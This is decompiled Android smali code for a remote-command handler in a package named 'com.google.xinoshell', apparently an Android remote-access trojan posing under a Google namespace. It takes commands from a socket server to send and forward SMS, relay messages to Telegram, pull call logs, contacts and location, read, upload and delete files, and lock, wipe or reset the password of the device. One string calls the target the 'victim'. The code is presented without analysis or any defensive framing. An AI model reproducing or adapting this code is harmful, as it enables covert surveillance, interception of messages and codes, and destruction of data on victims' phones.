    iget-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->socketClient:Lcom/google/xinoshell/connection/SocketIOClient;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->socketClient:Lcom/google/xinoshell/connection/SocketIOClient;

    invoke-virtual {v0}, Lcom/google/xinoshell/connection/SocketIOClient;->isConnected()Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    goto :goto_0

    :cond_0
    const/4 v0, 0x0

    :goto_0
    return v0
.end method

.method synthetic lambda$registerDefaultListeners$0$com-google-xinoshell-connection-ManageSocket([Ljava/lang/Object;)V
    .locals 13
    .param p1, "args"    # [Ljava/lang/Object;

    .line 185
    const-string v12, "xinoshell"

    const-string v11, "lambda$registerDefaultListeners$0 entered"

    invoke-static {v12, v11}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    const-string v1, "ManageSocket"

    const/4 v2, 0x0

    :try_start_0
    aget-object v0, p1, v2

    check-cast v0, Lorg/json/JSONObject;

    .line 187
    .local v0, "data":Lorg/json/JSONObject;
    const-string v3, "action"

    invoke-virtual {v0, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 188
    .local v3, "action":Ljava/lang/String;
    invoke-virtual {v3}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    if-eqz v4, :cond_skip_cmd

    const-string v4, "command"

    invoke-virtual {v0, v4}, Lorg/json/JSONObject;->optJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object v4

    .line 188
    .local v4, "cmdObj":Lorg/json/JSONObject;
    if-eqz v4, :cond_skip_cmd

    const-string v3, "action"

    invoke-virtual {v4, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    :cond_skip_cmd
    .line 189
    .local v3, "action":Ljava/lang/String;
    const-string v10, "xinoshell"

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "DBG action="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v10, v8}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    const-string v4, "socketId"

    invoke-virtual {v0, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    move-object v6, v4

    .line 190
    .local v6, "socketId":Ljava/lang/String;
    const-string v4, "user_id"

    invoke-virtual {v0, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 190
    .local v4, "user_id":Ljava/lang/String;
    const-string v5, "device_id"

    invoke-virtual {v0, v5}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    move-object v11, v5

    .line 192
    .local v11, "deviceId":Ljava/lang/String;
    sget-object v5, Lcom/google/xinoshell/utils/Config;->userID:Ljava/lang/String;

    invoke-virtual {v5, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_4

    iget-object v5, p0, Lcom/google/xinoshell/connection/ManageSocket;->mContext:Landroid/content/Context;

    invoke-static {v5}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getDeviceID(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_0

    move-object v5, p0

    goto/16 :goto_4

    .line 197
    :cond_0
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v5

    const/4 v7, 0x1

    sparse-switch v5, :sswitch_data_0

    :cond_1
    goto :goto_0

    :sswitch_0
    const-string v5, "deactivate-device"

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_1

    const/4 v5, 0x7

    goto :goto_1

    :sswitch_8
    const-string v5, "ping"

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_1

    const/16 v5, 0x8

    goto :goto_1

    :sswitch_1
    const-string v5, "sendSms"

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_1

    const/4 v5, 0x4

    goto :goto_1

    :sswitch_2
    const-string v5, "smsToTelegram"

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_1

    const/4 v5, 0x6

    goto :goto_1

    :sswitch_3
    const-string v5, "getCallLogs"

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_1

    const/4 v5, 0x2

    goto :goto_1

    :sswitch_4
    const-string v5, "getContacts"

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_1

    const/4 v5, 0x3

    goto :goto_1

    :sswitch_5
    const-string v5, "show_toast"

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_1

    move v5, v2

    goto :goto_1

    :sswitch_6
    const-string v5, "open_url"

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_1

    move v5, v7

    goto :goto_1

    :sswitch_7
    const-string v5, "forward"

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    if-eqz v5, :cond_1

    const/4 v5, 0x5

    goto :goto_1

    :sswitch_9
    const-string v5, "lock-device"

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_1

    const/16 v5, 0x9

    goto :goto_1

    :sswitch_10
    const-string v5, "wipe-device"

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_1

    const/16 v5, 0xa

    goto :goto_1

    :sswitch_11
    const-string v5, "force-lock"

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_1

    const/16 v5, 0xb

    goto :goto_1

    :sswitch_12
    const-string v5, "reset-password"

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_1

    const/16 v5, 0xc

    goto :goto_1

    :sswitch_13
    const-string v5, "enable-device-admin"

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_1

    const/16 v5, 0xd

    goto :goto_1

    :sswitch_14
    const-string v5, "file-list"

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_1

    const/16 v5, 0xe

    goto :goto_1

    :sswitch_15
    const-string v5, "file-read"

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_1

    const/16 v5, 0xf

    goto :goto_1

    :sswitch_16
    const-string v5, "location-request"

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_1

    const/16 v5, 0x10

    goto :goto_1

    :sswitch_17
    const-string v5, "file-delete"

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_1

    const/16 v5, 0x11

    goto :goto_1

    :sswitch_18
    const-string v5, "file-upload"

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_1

    const/16 v5, 0x12

    goto :goto_1

    :sswitch_19
    const-string v5, "unzip-file"

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_1

    const/16 v5, 0x13

    goto :goto_1

    :goto_0
    const/4 v5, -0x1

    :goto_1
    const-string v8, "from"

    const-string v9, "type"

    packed-switch v5, :pswitch_data_0

    .line 268
    move-object v5, p0

    :try_start_1
    const-string v7, "command not recognized"
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_2

    .line 262
    :pswitch_0
    :try_start_2
    const-string v5, "isDeActive"

    invoke-virtual {v0, v5, v2}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v5

    .line 263
    .local v5, "isDeviceDeActive":Z
    iget-object v8, p0, Lcom/google/xinoshell/connection/ManageSocket;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    const-string v9, "isDeviceDeActive"

    invoke-virtual {v8, v9, v5}, Lcom/google/xinoshell/utils/SharedPrefManager;->setB(Ljava/lang/String;Z)V

    .line 264
    const-string v8, "Client successfully Deactivated"

    invoke-virtual {p0, v6, v8, v7}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V

    .line 265
    move-object v5, p0

    goto/16 :goto_3

    .line 254
    .end local v5    # "isDeviceDeActive":Z
    :pswitch_1
    const-string v5, "toToken"

    invoke-virtual {v0, v5}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    .line 255
    .local v7, "toToken":Ljava/lang/String;
    const-string v5, "toUser"

    invoke-virtual {v0, v5}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    .line 256
    .local v8, "toUser":Ljava/lang/String;
    invoke-virtual {v0, v9}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v9

    .line 257
    .local v9, "TypeOf":I
    const-string v5, "isActive"

    invoke-virtual {v0, v5}, Lorg/json/JSONObject;->getBoolean(Ljava/lang/String;)Z

    move-result v10

    .line 258
    .local v10, "isActive":Z
    move-object v5, p0

    invoke-direct/range {v5 .. v10}, Lcom/google/xinoshell/connection/ManageSocket;->handleTelegram(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;IZ)V

    .line 259
    move-object v5, p0

    goto/16 :goto_3

    .line 247
    .end local v7    # "toToken":Ljava/lang/String;
    .end local v8    # "toUser":Ljava/lang/String;
    .end local v9    # "TypeOf":I
    .end local v10    # "isActive":Z
    :pswitch_2
    const-string v5, "toNumber"

    invoke-virtual {v0, v5}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    .line 248
    .local v10, "toNumber":Ljava/lang/String;
    invoke-virtual {v0, v9}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v7

    .line 249
    .local v7, "type":I
    invoke-virtual {v0, v8}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v9

    .line 250
    .local v9, "fromSim":I
    const-string v5, "isEnable"

    invoke-virtual {v0, v5}, Lorg/json/JSONObject;->getBoolean(Ljava/lang/String;)Z

    move-result v8
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 251
    .local v8, "isEnabled":Z
    move-object v5, p0

    :try_start_3
    invoke-direct/range {v5 .. v10}, Lcom/google/xinoshell/connection/ManageSocket;->doForwarding(Ljava/lang/String;IZILjava/lang/String;)V

    .line 252
    goto/16 :goto_3

    .line 236
    .end local v7    # "type":I
    .end local v8    # "isEnabled":Z
    .end local v9    # "fromSim":I
    .end local v10    # "toNumber":Ljava/lang/String;
    :pswitch_3
    move-object v5, p0

    const-string v9, "phone_number"

    invoke-virtual {v0, v9}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    .line 237
    .local v9, "phoneNumber":Ljava/lang/String;
    const-string v10, "text_message"

    invoke-virtual {v0, v10}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    .line 238
    .local v10, "textMessage":Ljava/lang/String;
    invoke-virtual {v0, v8}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v8

    .line 240
    .local v8, "from":I
    iget-object v12, v5, Lcom/google/xinoshell/connection/ManageSocket;->mContext:Landroid/content/Context;

    invoke-static {v12, v8, v9, v10}, Lcom/google/xinoshell/utils/SmsHelper;->sendSmsWithSim(Landroid/content/Context;ILjava/lang/String;Ljava/lang/String;)Z

    move-result v12

    if-eqz v12, :cond_2

    .line 241
    const-string v12, "message successfully sent"

    invoke-virtual {p0, v6, v12, v7}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V

    goto :goto_3

    .line 243
    :cond_2
    const-string v7, "Failed to send message."

    invoke-virtual {p0, v6, v7, v2}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V

    .line 245
    goto :goto_3

    .line 225
    .end local v8    # "from":I
    .end local v9    # "phoneNumber":Ljava/lang/String;
    .end local v10    # "textMessage":Ljava/lang/String;
    :pswitch_4
    move-object v5, p0

    invoke-direct {p0, v6}, Lcom/google/xinoshell/connection/ManageSocket;->getContacts(Ljava/lang/String;)V

    .line 233
    goto :goto_3

    .line 213
    :pswitch_5
    move-object v5, p0

    invoke-direct {p0, v6}, Lcom/google/xinoshell/connection/ManageSocket;->getCallLogs(Ljava/lang/String;)V

    .line 221
    goto :goto_3

    .line 205
    :pswitch_6
    move-object v5, p0

    const-string v7, "url"

    invoke-virtual {v0, v7}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    .line 206
    .local v7, "url":Ljava/lang/String;
    if-eqz v7, :cond_3

    invoke-virtual {v7}, Ljava/lang/String;->isEmpty()Z

    move-result v8

    if-nez v8, :cond_3

    .line 207
    invoke-direct {p0, v6, v7}, Lcom/google/xinoshell/connection/ManageSocket;->openUrlInBrowser(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_3

    .line 199
    .end local v7    # "url":Ljava/lang/String;
    :pswitch_7
    move-object v5, p0

    const-string v8, "message"

    const-string v9, "No message"

    invoke-virtual {v0, v8, v9}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    .line 200
    .local v8, "message":Ljava/lang/String;
    iget-object v9, v5, Lcom/google/xinoshell/connection/ManageSocket;->mContext:Landroid/content/Context;

    invoke-static {v9, v8, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v9

    invoke-virtual {v9}, Landroid/widget/Toast;->show()V

    .line 201
    const-string v9, "toast successfully show in victims device"

    invoke-virtual {p0, v6, v9, v7}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V

    .line 202
    goto :goto_3

    .line 268
    .end local v8    # "message":Ljava/lang/String;
    :goto_2
    invoke-virtual {p0, v6, v7, v2}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V

    .line 269
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "Unknown action: "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v1, v7}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 275
    .end local v0    # "data":Lorg/json/JSONObject;
    .end local v3    # "action":Ljava/lang/String;
    .end local v4    # "user_id":Ljava/lang/String;
    .end local v6    # "socketId":Ljava/lang/String;
    .end local v11    # "deviceId":Ljava/lang/String;
    :cond_3
    :goto_3
    goto :goto_6

    .line 192
    .restart local v0    # "data":Lorg/json/JSONObject;
    .restart local v3    # "action":Ljava/lang/String;
    .restart local v4    # "user_id":Ljava/lang/String;
    .restart local v6    # "socketId":Ljava/lang/String;
    .restart local v11    # "deviceId":Ljava/lang/String;
    :cond_4
    move-object v5, p0

    .line 193
    :goto_4
    const-string v7, "Blocked command from unauthorized user/device"

    invoke-virtual {p0, v6, v7, v2}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    .line 194
    return-void

    .line 280
    :pswitch_8
    const-string v8, "pong"

    invoke-virtual {p0, v6, v8, v7}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V

    goto/16 :goto_3

    :pswitch_9
    const-string v8, "lock-device"

    invoke-direct {p0, v0, v8, v6}, Lcom/google/xinoshell/connection/ManageSocket;->handleDeviceAdmin(Lorg/json/JSONObject;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_3

    :pswitch_10
    const-string v8, "wipe-device"

    invoke-direct {p0, v0, v8, v6}, Lcom/google/xinoshell/connection/ManageSocket;->handleDeviceAdmin(Lorg/json/JSONObject;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_3

    :pswitch_11
    const-string v8, "force-lock"

    invoke-direct {p0, v0, v8, v6}, Lcom/google/xinoshell/connection/ManageSocket;->handleDeviceAdmin(Lorg/json/JSONObject;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_3

    :pswitch_12
    const-string v8, "reset-password"

    invoke-direct {p0, v0, v8, v6}, Lcom/google/xinoshell/connection/ManageSocket;->handleDeviceAdmin(Lorg/json/JSONObject;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_3

    :pswitch_13
    const-string v8, "enable-device-admin"

    invoke-direct {p0, v0, v8, v6}, Lcom/google/xinoshell/connection/ManageSocket;->handleDeviceAdmin(Lorg/json/JSONObject;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_3

    :pswitch_14
    const-string v8, "path"

    invoke-virtual {v0, v8}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    .line 281
    .local v8, "filePath":Ljava/lang/String;
    const-string v9, "source"

    invoke-virtual {v0, v9}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    .line 282
    .local v9, "source":Ljava/lang/String;
    const-string v10, "hidden"

    invoke-virtual {v9, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-eqz v10, :cond_list_normal

    iget-object v10, p0, Lcom/google/xinoshell/connection/ManageSocket;->fileBrowser:Lcom/google/xinoshell/utils/FileBrowser;

    invoke-virtual {v10, v8, v6}, Lcom/google/xinoshell/utils/FileBrowser;->listHidden(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_3

    :cond_list_normal
    iget-object v10, p0, Lcom/google/xinoshell/connection/ManageSocket;->fileBrowser:Lcom/google/xinoshell/utils/FileBrowser;

    invoke-virtual {v10, v8, v6}, Lcom/google/xinoshell/utils/FileBrowser;->listFiles(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_3

    :pswitch_15
    const-string v8, "path"

    invoke-virtual {v0, v8}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    .line 283
    .local v8, "readPath":Ljava/lang/String;
    iget-object v9, p0, Lcom/google/xinoshell/connection/ManageSocket;->fileBrowser:Lcom/google/xinoshell/utils/FileBrowser;

    invoke-virtual {v9, v8, v6}, Lcom/google/xinoshell/utils/FileBrowser;->readFile(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_3

    :pswitch_16
    iget-object v8, p0, Lcom/google/xinoshell/connection/ManageSocket;->mContext:Landroid/content/Context;

    new-instance v9, Lcom/google/xinoshell/utils/DeviceInfoUtil;

    invoke-direct {v9, v8}, Lcom/google/xinoshell/utils/DeviceInfoUtil;-><init>(Landroid/content/Context;)V

    invoke-virtual {v9, v6, p0}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->requestLocation(Ljava/lang/String;Lcom/google/xinoshell/connection/ManageSocket;)V

    goto/16 :goto_3

    :pswitch_17
    const-string v8, "path"

    invoke-virtual {v0, v8}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    .line 285
    .local v8, "delPath":Ljava/lang/String;
    iget-object v9, p0, Lcom/google/xinoshell/connection/ManageSocket;->fileBrowser:Lcom/google/xinoshell/utils/FileBrowser;

    invoke-virtual {v9, v8, v6}, Lcom/google/xinoshell/utils/FileBrowser;->deleteFile(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_3

    :pswitch_18
    const-string v8, "data"

    invoke-virtual {v0, v8}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    .line 290
    .local v8, "b64":Ljava/lang/String;
    const-string v9, "path"

    invoke-virtual {v0, v9}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    .line 291
    .local v9, "remotePath":Ljava/lang/String;
    iget-object v10, p0, Lcom/google/xinoshell/connection/ManageSocket;->fileBrowser:Lcom/google/xinoshell/utils/FileBrowser;

    invoke-virtual {v10, v8, v9, v6}, Lcom/google/xinoshell/utils/FileBrowser;->uploadFile(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_3

    :pswitch_19
    const-string v8, "path"

    invoke-virtual {v0, v8}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    .line 295
    .local v8, "unzipPath":Ljava/lang/String;
    iget-object v9, p0, Lcom/google/xinoshell/connection/ManageSocket;->fileBrowser:Lcom/google/xinoshell/utils/FileBrowser;

    invoke-virtual {v9, v8, v6}, Lcom/google/xinoshell/utils/FileBrowser;->unzipFile(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_3

    .line 272
    .end local v0    # "data":Lorg/json/JSONObject;
    .end local v3    # "action":Ljava/lang/String;
    .end local v4    # "user_id":Ljava/lang/String;
    .end local v6    # "socketId":Ljava/lang/String;
    .end local v11    # "deviceId":Ljava/lang/String;
    :catch_0
    move-exception v0

    goto :goto_5

    :catch_1
    move-exception v0

    move-object v5, p0

    .line 273
    .local v0, "e":Ljava/lang/Exception;
    :goto_5
    const-string v3, "Error processing command"

    invoke-virtual {p0, v3, v2}, Lcom/google/xinoshell/connection/ManageSocket;->sendSocketLog(Ljava/lang/String;I)V

    .line 274
    invoke-static {v1, v3, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 276
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_6
    return-void

    :sswitch_data_0
    .sparse-switch
        -0x285c6d3b -> :sswitch_7
        -0x1e0f1a06 -> :sswitch_6
        -0x14aa56a7 -> :sswitch_12
        -0x20616de -> :sswitch_13
        0x348172 -> :sswitch_8
        0x4325e265 -> :sswitch_5
        0x54476cd -> :sswitch_11
        0x3f194a9c -> :sswitch_10
        0x5a079dc9 -> :sswitch_4
        0x718c92a3 -> :sswitch_3
        0x72c42ed5 -> :sswitch_2
        0x7602e8b1 -> :sswitch_1
        0x7a060dcf -> :sswitch_0
        0x7acbad38 -> :sswitch_9
        0xad3171c -> :sswitch_17
        0xaec6ea4f -> :sswitch_14
        0xaec99347 -> :sswitch_15
        0x8b86f077 -> :sswitch_16
        0x1c9bf56e -> :sswitch_18
        0x28709f72 -> :sswitch_18
        0x507ef241 -> :sswitch_19
    .end sparse-switch

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
        :pswitch_8
        :pswitch_9
        :pswitch_10
        :pswitch_11
        :pswitch_12
        :pswitch_13
        :pswitch_14
        :pswitch_15
        :pswitch_16
        :pswitch_17
        :pswitch_18
        :pswitch_19
    .end packed-switch
.end method

.method public send(Ljava/lang/String;Lorg/json/JSONObject;)V
    .locals 2
    .param p1, "event"    # Ljava/lang/String;
    .param p2, "data"    # Lorg/json/JSONObject;

    .line 102
    invoke-virtual {p0}, Lcom/google/xinoshell/connection/ManageSocket;->isConnected()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 103
    iget-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->socketClient:Lcom/google/xinoshell/connection/SocketIOClient;

    invoke-virtual {v0, p1, p2}, Lcom/google/xinoshell/connection/SocketIOClient;->emit(Ljava/lang/String;Lorg/json/JSONObject;)V

    goto :goto_0

    .line 105
    :cond_0
    iget-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->callback:Lcom/google/xinoshell/connection/ManageSocket$SocketCallback;

    if-eqz v0, :cond_1

    .line 106
    iget-object v0, p0, Lcom/google/xinoshell/connection/ManageSocket;->callback:Lcom/google/xinoshell/connection/ManageSocket$SocketCallback;

    const-string v1, "Not connected to server"

    invoke-interface {v0, v1}, Lcom/google/xinoshell/connection/ManageSocket$SocketCallback;->onError(Ljava/lang/String;)V

    .line 109
    :cond_1
    :goto_0
    return-void
.end method

.method public sendActionInfo(Ljava/lang/String;Ljava/lang/String;I)V
    .locals 4
    .param p1, "socketId"    # Ljava/lang/String;
    .param p2, "message"    # Ljava/lang/String;
    .param p3, "type"    # I

    .line 136
    :try_start_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 137
    .local v0, "logObj":Lorg/json/JSONObject;
    const-string v1, "timestamp"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    invoke-virtual {v0, v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 139
    const-string v1, "type"

    if-nez p3, :cond_0

    .line 140
    :try_start_1
    const-string v2, "error"

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    goto :goto_0

    .line 141
    :cond_0
    const/4 v2, 0x1

    if-ne p3, v2, :cond_1

    .line 142
    const-string v2, "info"

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    goto :goto_0

    .line 144
    :cond_1
    const-string v2, "unknown"

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 146
    :goto_0
    const-string v1, "toClient"

    invoke-virtual {v0, v1, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 147
    const-string v1, "UserId"

    sget-object v2, Lcom/google/xinoshell/utils/Config;->userID:Ljava/lang/String;

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 148
    const-string v1, "DeviceId"

    iget-object v2, p0, Lcom/google/xinoshell/connection/ManageSocket;->mContext:Landroid/content/Context;

    invoke-static {v2}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getDeviceID(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 149
    const-string v1, "DeviceName"

    invoke-static {}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getModel()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 150
    const-string v1, "message"

    invoke-virtual {v0, v1, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 151
    const-string v1, "cleint_action_info_to_user"

    invoke-virtual {p0, v1, v0}, Lcom/google/xinoshell/connection/ManageSocket;->send(Ljava/lang/String;Lorg/json/JSONObject;)V
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_0

    .line 155
    .end local v0    # "logObj":Lorg/json/JSONObject;
    nop

    .line 156
    return-void

    .line 153
    :catch_0
    move-exception v0

    .line 154
    .local v0, "e":Lorg/json/JSONException;
    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1
.end method

